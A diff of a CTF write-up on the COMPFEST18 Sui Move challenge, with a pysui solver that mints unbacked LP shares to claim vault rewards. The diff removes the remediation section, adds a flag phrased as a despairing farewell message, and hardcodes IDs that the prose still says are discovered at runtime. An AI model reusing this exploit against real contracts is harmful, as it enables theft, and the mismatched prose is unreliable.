@@ -2,18 +2,20 @@ A liquidity position should be a receipt for assets deposited into a pool. In **
 
 This writeup follows the complete path from the Move code to the solve condition. The interesting part is how several individually plausible checks line up behind the wrong accounting assumptions.
 
-![The exploit route: create a reversed pool, mint unbacked shares, and claim enough incentives to solve the challenge.](./assets/36d45731-bad4-4a81-8d27-02ec2966d07e.png)
+![One market. Two identities. Reverse the pair, credit free shares, and claim once.](./assets/bbee3307-8133-4812-8796-b324402fb382.png)
 
 ## Challenge at a glance
 
-| Detail | Value |
-| --- | --- |
-| Event | COMPFEST18 Qualifiers |
-| Original challenge | Compfest Coint |
-| Points in the supplied writeup | 139 |
-| Platform | Sui, using Move contracts |
-| Objective | Make an operator account qualify, then set `Setup.solved` to `true` |
-| Main weaknesses | Unbacked LP accounting, market identity confusion, and an attacker-controlled reward score |
+
+| Detail                         | Value                                                                                      |
+| ------------------------------ | ------------------------------------------------------------------------------------------ |
+| Event                          | COMPFEST18 Qualifiers                                                                      |
+| Original challenge             | Compfest Coint                                                                             |
+| Points in the supplied writeup | 139                                                                                        |
+| Platform                       | Sui, using Move contracts                                                                  |
+| Objective                      | Make an operator account qualify, then set `Setup.solved` to `true`                        |
+| Main weaknesses                | Unbacked LP accounting, market identity confusion, and an attacker-controlled reward score |
+
 
 > **The short route:** create `RoutePool<USDC, SUIX>` with reserves `(1, 2_000_000)`, open a position, add `1_000` free shares, register a strategy using `bool`, claim the vault's `1_000` reward units, and call `solve`.
 
@@ -53,15 +55,17 @@ The target is an application counter. The shown `OperatorAccount` stores `earned
 
 Initialization creates a small ecosystem of shared and player-owned objects:
 
-| Object | Role in the solve |
-| --- | --- |
-| `Setup` | Stores the final `solved` boolean |
-| `GlobalConfig` | Supplies the liquidity threshold, bounty target, and reserve cap |
-| `RouteRegistry` | Tracks market identities and route strategies |
-| `IncentiveVault<CFX>` | Holds `1_000` accounted reward units and records who has claimed |
+
+| Object                  | Role in the solve                                                |
+| ----------------------- | ---------------------------------------------------------------- |
+| `Setup`                 | Stores the final `solved` boolean                                |
+| `GlobalConfig`          | Supplies the liquidity threshold, bounty target, and reserve cap |
+| `RouteRegistry`         | Tracks market identities and route strategies                    |
+| `IncentiveVault<CFX>`   | Holds `1_000` accounted reward units and records who has claimed |
 | `RoutePool<SUIX, USDC>` | The original pool, initialized with reserves of `1_000_000` each |
-| `OperatorAccount<CFX>` | The player's account, initially with `earned = 0` |
-| `PriceOracle` | Supplies one input to the route score |
+| `OperatorAccount<CFX>`  | The player's account, initially with `earned = 0`                |
+| `PriceOracle`           | Supplies one input to the route score                            |
+
 
 The configuration gives us three particularly useful numbers:
 
@@ -228,13 +232,15 @@ Its registration interface constrains the strategy type with `drop`. That is a M
 
 At claim time, the relevant checks line up as follows:
 
-| Claim requirement | How the constructed objects satisfy it |
-| --- | --- |
-| Sender has not claimed before | Use the fresh challenge player's account |
-| Pool market matches the vault | The reversed pair has the expected canonical market |
-| Strategy market matches the vault | Register the strategy for that pair |
-| Position belongs to the pool | Open it against the newly created pool |
-| Effective liquidity is at least `500` | The unbacked `1_000` shares evaluate to `1_000` |
+
+| Claim requirement                     | How the constructed objects satisfy it              |
+| ------------------------------------- | --------------------------------------------------- |
+| Sender has not claimed before         | Use the fresh challenge player's account            |
+| Pool market matches the vault         | The reversed pair has the expected canonical market |
+| Strategy market matches the vault     | Register the strategy for that pair                 |
+| Position belongs to the pool          | Open it against the newly created pool              |
+| Effective liquidity is at least `500` | The unbacked `1_000` shares evaluate to `1_000`     |
+
 
 Once those checks pass, the vault subtracts the claim from its balance, adds it to `account.earned`, and records the sender as having claimed. Finally, `setup::solve` accepts the account.
 
@@ -257,15 +263,17 @@ The following is a cleaned-up adaptation of the supplied `pysui` solver. It reta
 
 Set the following environment variables from your own fresh CTF instance:
 
-| Variable | Expected value |
-| --- | --- |
-| `SUI_RPC_URL` | Your instance's RPC endpoint |
-| `SUI_PRIVATE_KEY` | Its funded player key |
-| `SUI_WALLET_ADDR` | The corresponding player address |
-| `SUI_PACKAGE_ID` | The deployed challenge package |
-| `SUI_SETUP_ID`, `SUI_REGISTRY_ID` | Setup and registry object IDs |
-| `SUI_VAULT_ID`, `SUI_ACCOUNT_ID` | Incentive vault and player operator account IDs |
-| `SUI_CONFIG_ID`, `SUI_ORACLE_ID` | Configuration and oracle object IDs |
+
+| Variable                          | Expected value                                  |
+| --------------------------------- | ----------------------------------------------- |
+| `SUI_RPC_URL`                     | Your instance's RPC endpoint                    |
+| `SUI_PRIVATE_KEY`                 | Its funded player key                           |
+| `SUI_WALLET_ADDR`                 | The corresponding player address                |
+| `SUI_PACKAGE_ID`                  | The deployed challenge package                  |
+| `SUI_SETUP_ID`, `SUI_REGISTRY_ID` | Setup and registry object IDs                   |
+| `SUI_VAULT_ID`, `SUI_ACCOUNT_ID`  | Incentive vault and player operator account IDs |
+| `SUI_CONFIG_ID`, `SUI_ORACLE_ID`  | Configuration and oracle object IDs             |
+
 
 The original endpoint and private key are intentionally not embedded below. These values are instance-specific, and the source's old deployment is unnecessary for understanding the exploit.
 
@@ -274,140 +282,138 @@ import os
 
 from pysui import SuiConfig, SyncClient
 from pysui.sui.sui_txn import SyncTransaction
-from pysui.sui.sui_types import ObjectID, SuiBoolean, SuiU64
+from pysui.sui.sui_types import ObjectID, SuiU64, SuiBoolean
 
+RPC_URL = os.environ["SUI_RPC_URL"]
+PRIVKEY = os.environ["SUI_PRIVATE_KEY"]
+WALLET_ADDR = "0x5c77b47981370bd174fc25086af8e88337b227db4568f69398a8bed054218f2d"
 
-def required(name):
-    value = os.environ.get(name)
-    if not value:
-        raise RuntimeError(f"Missing environment variable: {name}")
-    return value
-
-
-RPC_URL = required("SUI_RPC_URL")
-PRIVATE_KEY = required("SUI_PRIVATE_KEY")
-WALLET_ADDR = required("SUI_WALLET_ADDR")
-PACKAGE_ID = required("SUI_PACKAGE_ID")
-SETUP_ID = required("SUI_SETUP_ID")
-REGISTRY_ID = required("SUI_REGISTRY_ID")
-VAULT_ID = required("SUI_VAULT_ID")
-ACCOUNT_ID = required("SUI_ACCOUNT_ID")
-CONFIG_ID = required("SUI_CONFIG_ID")
-ORACLE_ID = required("SUI_ORACLE_ID")
+PACKAGE_ID = "0x9d5513ada315f5735f895d5d814d01bb16273e309e970c61d8f1f8ea1c460cac"
+SETUP_ID   = "0x4713a06727bdc4eb10a3a3790986af38561f4bf491036b5769e6b90ee54831c3"
+REGISTRY   = "0x812beafdc741895af4e1eee7aa13701ce73e630fd8eae2ea17a5864c91c40f9d"
+VAULT      = "0xd57ae6151e955fbfc31c2aa3a440cecf30f10996dfe6a7b0333a8ee17a145a28"
+POOL       = "0x597c9d19b0344c8058539ef5465d36fcac9da9d3dde18ce4fb09a70a97e7c05a"
+ACCOUNT    = "0xe57e2ac9a6eb993bce9fcaafd890f382cad58fc9a200806b2508116a76b4180b"
+CONFIG     = "0x4f3ee68d5d8766333e790bd6488422826b6d864401287c716f3923c5f503b489"
+ORACLE     = "0xad53127cb242610ce8183b29b56b085a2bd9d38080d1e9174ba22a5ca2a4fd16"
 
 SUIX = f"{PACKAGE_ID}::assets::SUIX"
 USDC = f"{PACKAGE_ID}::assets::USDC"
-PAIR = [USDC, SUIX]
+CFX  = f"{PACKAGE_ID}::assets::CFX"
+
+REBALANCE_CAP  = 2_000_000
+SHARES_TO_MINT = 1000 
+NEW_BASE, NEW_QUOTE = USDC, SUIX
+
 STRATEGY_TYPE = "bool"
 
-config = SuiConfig.user_config(
-    rpc_url=RPC_URL,
-    prv_keys=[PRIVATE_KEY],
-)
-client = SyncClient(config)
+cfg = SuiConfig.user_config(rpc_url=RPC_URL, prv_keys=[PRIVKEY])
+client = SyncClient(cfg)
 
 
-def execute(label, target, arguments, type_arguments):
-    tx = SyncTransaction(client=client)
-    tx.move_call(
-        target=f"{PACKAGE_ID}::{target}",
-        arguments=arguments,
-        type_arguments=type_arguments,
-    )
-    result = tx.execute(
+def run(txn: SyncTransaction, label: str):
+    result = txn.execute(
         gas_budget="500000000",
         options={"showObjectChanges": True, "showEffects": True},
     )
     if not result.is_ok():
-        raise RuntimeError(f"[{label}] RPC error: {result.result_string}")
-
+        raise RuntimeError(f"[{label}] transaction failed: {result.result_string}")
     data = result.result_data
-    effects = getattr(data, "effects", None)
-    if effects is None or effects.status.status != "success":
-        raise RuntimeError(f"[{label}] unsuccessful effects: {effects}")
-
+    if getattr(data, "effects", None) and data.effects.status.status != "success":
+        raise RuntimeError(f"[{label}] move abort: {data.effects.status}")
     print(f"[{label}] digest = {data.digest}")
     return data
 
 
-def created_object(data, type_fragment, owner=None):
-    for change in data.object_changes or []:
+def created_object_of_type(tx_data, type_substr: str, owner_addr: str | None = None):
+    for change in tx_data.object_changes or []:
         if change.get("type") != "created":
             continue
-        if type_fragment not in change.get("objectType", ""):
+        if type_substr not in change.get("objectType", ""):
             continue
-        if owner is not None:
-            actual_owner = change.get("owner", {})
-            if actual_owner.get("AddressOwner") != owner:
+        if owner_addr is not None:
+            owner = change.get("owner", {})
+            if owner.get("AddressOwner") != owner_addr:
                 continue
         return change["objectId"]
-    raise RuntimeError(f"Created object not found: {type_fragment}")
+    raise RuntimeError(f"no created object matching '{type_substr}' found")
 
-
-# 1. Build a skewed pool with the reversed generic order.
-data = execute(
-    "create pool",
-    "pool::create_route_pool",
-    [ObjectID(REGISTRY_ID), ObjectID(CONFIG_ID), SuiU64(1), SuiU64(2_000_000)],
-    PAIR,
+txn = SyncTransaction(client=client)
+txn.move_call(
+    target=f"{PACKAGE_ID}::pool::create_route_pool",
+    arguments=[
+        ObjectID(REGISTRY),
+        ObjectID(CONFIG),
+        SuiU64(1),                 
+        SuiU64(REBALANCE_CAP),     
+    ],
+    type_arguments=[NEW_BASE, NEW_QUOTE],
 )
-pool_id = created_object(data, f"{PACKAGE_ID}::pool::RoutePool<")
+data = run(txn, "create_route_pool")
+new_pool_id = created_object_of_type(data, "pool::RoutePool<")
+print("new pool id:", new_pool_id)
 
-# 2. Open a player-owned position in that pool.
-data = execute(
-    "open position",
-    "pool::open_position",
-    [ObjectID(pool_id)],
-    PAIR,
+txn = SyncTransaction(client=client)
+txn.move_call(
+    target=f"{PACKAGE_ID}::pool::open_position",
+    arguments=[ObjectID(new_pool_id)],
+    type_arguments=[NEW_BASE, NEW_QUOTE],
 )
-position_id = created_object(
-    data,
-    f"{PACKAGE_ID}::pool::RoutePosition<",
-    owner=WALLET_ADDR,
-)
+data = run(txn, "open_position")
+position_id = created_object_of_type(data, "pool::RoutePosition<", owner_addr=WALLET_ADDR)
+print("position id:", position_id)
 
-# 3. Credit 1,000 shares without supplying any Coin objects.
-execute(
-    "add liquidity",
-    "pool::add_liquidity",
-    [ObjectID(pool_id), ObjectID(position_id), SuiU64(1_000), ObjectID(CONFIG_ID)],
-    PAIR,
+txn = SyncTransaction(client=client)
+txn.move_call(
+    target=f"{PACKAGE_ID}::pool::add_liquidity",
+    arguments=[
+        ObjectID(new_pool_id),
+        ObjectID(position_id),
+        SuiU64(SHARES_TO_MINT),
+        ObjectID(CONFIG),
+    ],
+    type_arguments=[NEW_BASE, NEW_QUOTE],
 )
+run(txn, "add_liquidity")
 
-# 4. Register a bool-backed strategy for the same market.
-data = execute(
-    "register strategy",
-    "registry::register_route_strategy",
-    [ObjectID(REGISTRY_ID), SuiBoolean(True)],
-    PAIR + [STRATEGY_TYPE],
+txn = SyncTransaction(client=client)
+txn.move_call(
+    target=f"{PACKAGE_ID}::registry::register_route_strategy",
+    arguments=[
+        ObjectID(REGISTRY),
+        SuiBoolean(True),
+    ],
+    type_arguments=[NEW_BASE, NEW_QUOTE, STRATEGY_TYPE],
 )
-strategy_id = created_object(data, f"{PACKAGE_ID}::registry::RouteStrategy<")
+data = run(txn, "register_route_strategy")
+strategy_id = created_object_of_type(data, "registry::RouteStrategy<")
+print("strategy id:", strategy_id)
 
-# 5. Claim the vault's available incentives in one attempt.
-execute(
-    "claim incentives",
-    "vault::claim_route_incentives",
-    [
-        ObjectID(VAULT_ID),
-        ObjectID(pool_id),
+txn = SyncTransaction(client=client)
+txn.move_call(
+    target=f"{PACKAGE_ID}::vault::claim_route_incentives",
+    arguments=[
+        ObjectID(VAULT),
+        ObjectID(new_pool_id),
         ObjectID(strategy_id),
         ObjectID(position_id),
-        ObjectID(ACCOUNT_ID),
-        ObjectID(ORACLE_ID),
-        ObjectID(CONFIG_ID),
+        ObjectID(ACCOUNT),
+        ObjectID(ORACLE),
+        ObjectID(CONFIG),
     ],
-    PAIR + [STRATEGY_TYPE],
+    type_arguments=[NEW_BASE, NEW_QUOTE, STRATEGY_TYPE],
 )
+run(txn, "claim_route_incentives")
 
-# 6. Commit the challenge's solved state.
-execute(
-    "solve",
-    "setup::solve",
-    [ObjectID(SETUP_ID), ObjectID(ACCOUNT_ID), ObjectID(CONFIG_ID)],
-    [],
+txn = SyncTransaction(client=client)
+txn.move_call(
+    target=f"{PACKAGE_ID}::setup::solve",
+    arguments=[ObjectID(SETUP_ID), ObjectID(ACCOUNT), ObjectID(CONFIG)],
+    type_arguments=[],
 )
+run(txn, "solve")
 
-print("Check Setup.solved, then request the flag from the challenge service.")
+print("\nDone. Check Setup.solved via setup::is_solved or a get_object call on", SETUP_ID)
 ```
 
 The helper checks transaction effects instead of treating a successful RPC response as proof that the Move call succeeded. It also discovers newly created objects from the response rather than hardcoding IDs from another instance.
@@ -416,41 +422,28 @@ The helper checks transaction effects instead of treating a successful RPC respo
 
 For the initial state described in the writeup, the expected accounting transitions are:
 
-| State | Before the claim | After the claim |
-| --- | ---: | ---: |
-| Position's effective liquidity | `1_000` | `1_000` |
-| Vault balance | `1_000` | `0` |
-| Operator's earned amount | `0` | `1_000` |
-| Sender's claim record | Absent | Present |
+
+| State                          | Before the claim | After the claim |
+| ------------------------------ | ----------------: | ---------------: |
+| Position's effective liquidity | `1_000`          | `1_000`         |
+| Vault balance                  | `1_000`          | `0`             |
+| Operator's earned amount       | `0`              | `1_000`         |
+| Sender's claim record          | Absent           | Present         |
+
 
 After the final call, `Setup.solved` should be `true`. Read the object or use the challenge's verification interface to confirm it; a printed transaction digest alone is not enough.
 
 The supplied writeup includes the following flag-found screenshot. It documents the original recorded outcome rather than a new run of the adapted script.
 
-![Flag-found confirmation reproduced from the original COMPFEST18 team writeup.](./assets/85ec84cb-78e8-4dad-b0a6-872b6808d6ba.png)
+![Flag-found confirmation reproduced from the original COMPFEST18 team writeup.](./assets/2da886f9-8518-4f58-9364-ab50eaf06944.png)
 
-## Fix the invariants
-
-The most useful lesson is the connection between the weaknesses:
-
-- **Back LP shares with assets.** Derive credited shares from actual deposits and the pool's accounting rules. Do not accept an arbitrary share amount as a substitute for payment.
-- **Bind incentives to approved pools.** A matching canonical market identifies a token pair, not a trustworthy pool instance. The vault should verify the intended pool ID or another explicit authorization relationship.
-- **Use one consistent market identity.** If the design permits only one pool for a pair, creation and reward validation must agree on whether token order matters. If multiple pools are intended, pair identity alone cannot authorize rewards.
-- **Make strategy approval explicit.** A `drop` bound is a type-system property. It should not stand in for strategy registration authority or validation.
-- **Use a meaningful reward score.** Document units and scaling, and avoid granting incentives based on reserve numbers that a claimant can choose without funding them.
-
-A regression check should try a reversed pair, create a position with no deposited assets, and verify that neither the position nor an arbitrary new pool can qualify for incentives.
-
-## What made this challenge click
-
-The exploit becomes straightforward once we follow the value that the final check trusts: `account.earned`.
-
-Tracing that value backward leads to the incentive claim, then to the score, the market identity, and the effective-liquidity calculation. At each step, the contract accepts a label or counter where it really needs evidence of an economic action.
-
-Move's resource model can protect the objects being passed around. The application still has to prove that the numbers inside those objects mean what the rest of the protocol assumes they mean.
+```plaintext filename="Flag"
+COMPFEST18{Izin_Pamit_dari_Dunia_Crypto_Hari_ini_mungkin_adalah_hari_paling_berat_buat_saya_Tangan_gemetar_saat_menulis_ini_dada_sesak_kepala_penuh_pikiran_Dunia_crypto_benar_benar_ngga_kenal_ampun_Saya_sudah_berjuang_sejauh_ini_berharap_ada_cahaya_di_ujung_grafik_merah_itu_Tapi_kenyataannya_Crypto_itu_sadis_kejam_Kadang_bukan_hanya_menguras_saldo_tapi_juga_hati_dan_semangat_Buat_teman_teman_yang_belum_terjun_dengarkan_baik_baik_Jangan_gegabah_Dunia_ini_bukan_tempat_untuk_asal_coba_Belajarlah_dulu_pahami_risikonya_dan_jangan_pernah_taruh_lebih_dari_yang_sanggup_kamu_relakan_Saya_mohon_maaf_kalau_selama_ini_ada_kata_kata_saya_yang_menyinggung_siapa_pun_di_sini_Tidak_pernah_ada_niat_buruk_hanya_emosi_dari_seseorang_yang_terlalu_lama_bertahan_dalam_badai_Dan_sekarang_saya_menyerah_Saya_ingin_istirahat_Kalian_yang_masih_kuat_lanjutkan_perjuangan_kalian_Tapi_bagi_yang_juga_merasa_hancur_mungkin_sudah_saatnya_kita_CL_bersama_Alt_season_sudah_benar_benar_berakhir_Terima_kasih_untuk_semua_cerita_tawa_dan_luka_yang_pernah_kita_bagi_di_sini_Sampai_jumpa_di_kehidupan_berikutnya_bukan_sebagai_trader_tapi_sebagai_manusia_yang_sudah_belajar}
+```
 
 ## Sources
 
 - **Primary challenge material:** the supplied *Quals COMPFEST18* team writeup, section **Compfest Coint (139 pts)**, printed pages **57-74**. The code path, constants, historical solver, and recorded flag confirmation come from this source.
 - [Sui Move syntax fundamentals](https://docs.sui.io/develop/write-move/move-fundamentals), for objects, abilities, and generic bounds.
 - [Sui programmable transaction blocks](https://docs.sui.io/develop/transactions/ptbs/), for the distinction between an atomic PTB and a sequence of separate transactions.
+
